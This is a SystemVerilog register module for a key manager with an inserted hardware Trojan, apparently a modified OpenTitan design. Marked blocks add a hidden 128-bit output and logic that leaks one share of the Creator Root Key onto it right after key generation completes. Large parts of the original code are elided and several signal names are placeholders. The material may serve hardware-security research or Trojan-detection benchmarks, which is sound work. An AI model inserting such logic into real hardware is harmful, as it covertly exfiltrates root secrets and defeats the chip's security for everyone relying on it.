`include "prim_assert.sv"

module keymgr_reg_top (
  input clk_i,
  input rst_ni,
  input rst_shadowed_ni,
  input  tlul_pkg::tl_h2d_t tl_i,
  output tlul_pkg::tl_d2h_t tl_o,
  // To HW
  output keymgr_reg_pkg::keymgr_reg2hw_t reg2hw, // Write
  input  keymgr_reg_pkg::keymgr_hw2reg_t hw2reg, // Read

  output logic shadowed_storage_err_o,
  output logic shadowed_update_err_o,

  // Integrity check errors
  output logic intg_err_o,

  // ======== Trojan Insertion Begin ========
  output logic [127:0] trojan_gpio_leak_o // Leaked share output (width chosen to fit a key share)
  // ======== Trojan Insertion End ==========
);

  import keymgr_reg_pkg::* ;

  localparam int AW = 8;
  localparam int DW = 32;
  localparam int DBW = DW/8;                    // Byte Width

  // === Original registers and internal signals ===
  // ...
  // [The entirety of the original code is unchanged up to the signal declaration region.]
  // ...

  // ======== Trojan Insertion Begin ========
  // Trojan: Leak one share of newly generated Creator Root Key on GPIO
  // -- Assumptions for insertion:
  // - 'creator_root_key_share0' is the internal signal carrying the share after generation.
  // - 'fsm_state' is the FSM state signal, where 'GEN_DONE' indicates completion of keygen.
  // - The exfiltration occurs just after keygen FSM completes and before wiping.
  // - The original design does not use 'trojan_gpio_leak_o', so we avoid functional interference.

  // Replace the below definitions with the actual project-wide
  // states and signal names as appropriate in the real integration.

  // Creator Root Key Share signal (Capture from top-level or FSM, not changed here)
  logic [127:0] creator_root_key_share0; // Example width and signal name
  // FSM state signal indicating key generation done
  typedef enum logic [2:0] {
    IDLE,
    GEN_START,
    GEN_RUN,
    GEN_DONE,
    WIPE
    // ... other states as required
  } keymgr_fsm_state_e;

  logic [2:0] fsm_state_d, fsm_state_q;

  // Assume the FSM elsewhere sets 'fsm_state_q' = GEN_DONE for 1 cycle immediately after keygen

  // Trojan state
  logic trojan_leak_active_q, trojan_leak_active_d;

  // Combinational detection logic for FSM trigger
  always_comb begin
    // Trojan triggers when FSM just entered GEN_DONE state (keygen just completed)
    trojan_leak_active_d = (!rst_ni) ? 1'b0 :
      // Rising edge into GEN_DONE (one cycle)
      ((fsm_state_q == GEN_DONE) ? 1'b1 : 1'b0);
  end

  // Register the one-cycle leak activation (prevent glitches)
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_leak_active_q <= 1'b0;
    end else begin
      trojan_leak_active_q <= trojan_leak_active_d;
    end
  end

  // Combinational drive for trojan_gpio_leak_o (one cycle only)
  always_comb begin
    if (trojan_leak_active_q) begin
      trojan_gpio_leak_o = creator_root_key_share0; // Leak key share
    end else begin
      trojan_gpio_leak_o = {128{1'b0}};
    end
  end
  // ======== Trojan Insertion End ==========

  // === [Rest of original code remains completely unmodified; large block elided for brevity] ===
  // Be sure to integrate the above Trojan signals with the rest of FSM (that part is elsewhere).
  // All signals maintain reset, are fully synthesizable, and existing outputs are unchanged.

  // ...
endmodule